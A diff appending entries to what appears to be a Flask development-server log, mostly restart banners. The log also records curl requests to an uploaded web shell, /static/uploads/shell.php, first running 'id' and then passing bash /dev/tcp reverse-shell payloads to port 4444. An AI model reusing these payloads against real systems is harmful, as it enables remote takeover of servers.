@@ -64289,3 +64289,36 @@
  * Running on http://127.0.0.1:5000
  * Running on http://192.168.100.205:5000
 2026-09-08 02:12:48,228 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:23:57,708 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.100.205:5000
+2026-09-10 00:23:57,708 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:26:50,187 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.100.205:5000
+2026-09-10 00:26:50,188 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:26:52,046 | INFO | CLIENT_IP=127.0.0.1 | METHOD=GET | PATH=/static/uploads/shell.php | QUERY=cmd=id | BODY= | AGENT="curl/8.21.0"
+2026-09-10 00:26:52,056 | INFO | 127.0.0.1 - - [10/Sep/2026 00:26:52] "GET /static/uploads/shell.php?cmd=id HTTP/1.1" 200 -
+2026-09-10 00:27:37,099 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.100.205:5000
+2026-09-10 00:27:37,099 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:27:40,432 | INFO | CLIENT_IP=127.0.0.1 | METHOD=GET | PATH=/static/uploads/shell.php | QUERY=cmd=id | BODY= | AGENT="curl/8.21.0"
+2026-09-10 00:27:40,440 | INFO | 127.0.0.1 - - [10/Sep/2026 00:27:40] "GET /static/uploads/shell.php?cmd=id HTTP/1.1" 200 -
+2026-09-10 00:28:40,965 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.100.205:5000
+2026-09-10 00:28:40,965 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:29:00,657 | INFO | CLIENT_IP=192.168.100.205 | METHOD=GET | PATH=/static/uploads/shell.php | QUERY=cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.205/4444+0>%261' | BODY= | AGENT="curl/8.21.0"
+2026-09-10 00:29:05,665 | INFO | 192.168.100.205 - - [10/Sep/2026 00:29:05] "GET /static/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.205/4444+0>%261' HTTP/1.1" 200 -
+2026-09-10 00:31:53,569 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.100.205:5000
+2026-09-10 00:31:53,570 | INFO | [33mPress CTRL+C to quit[0m
+2026-09-10 00:32:24,199 | INFO | CLIENT_IP=192.168.100.205 | METHOD=GET | PATH=/static/uploads/shell.php | QUERY=cmd=bash+-c+'bash+>%26+/dev/tcp/192.168.100.205/4444+0>%261' | BODY= | AGENT="curl/8.21.0"
+2026-09-10 00:32:29,203 | INFO | 192.168.100.205 - - [10/Sep/2026 00:32:29] "GET /static/uploads/shell.php?cmd=bash+-c+'bash+>%26+/dev/tcp/192.168.100.205/4444+0>%261' HTTP/1.1" 200 -
